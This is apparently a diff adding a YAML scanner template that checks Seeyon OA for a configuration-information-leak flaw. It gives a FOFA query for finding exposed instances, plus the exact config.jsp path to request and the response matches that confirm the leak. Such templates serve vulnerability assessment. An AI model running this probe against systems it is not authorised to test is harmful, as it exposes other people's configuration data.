@@ -1,0 +1,24 @@
+info:
+  vulId: seeyon_info_config
+  detail: 致远OA 配置信息泄露漏洞
+  fofaQuery: app="致远互联-OA"
+rules:
+  - request:
+      payload:
+        - ""
+      path: "{{rootUrl}}/yyoa/ext/trafaxserver/SystemManage/config.jsp"
+      method: GET
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36
+    checksCondition: and
+    checks:
+      - checkType: string
+        desireds:
+          - 配置信息
+        place: body
+        condition: and
+
+      - checkType: status
+        desireds:
+          - 200
+        condition: and
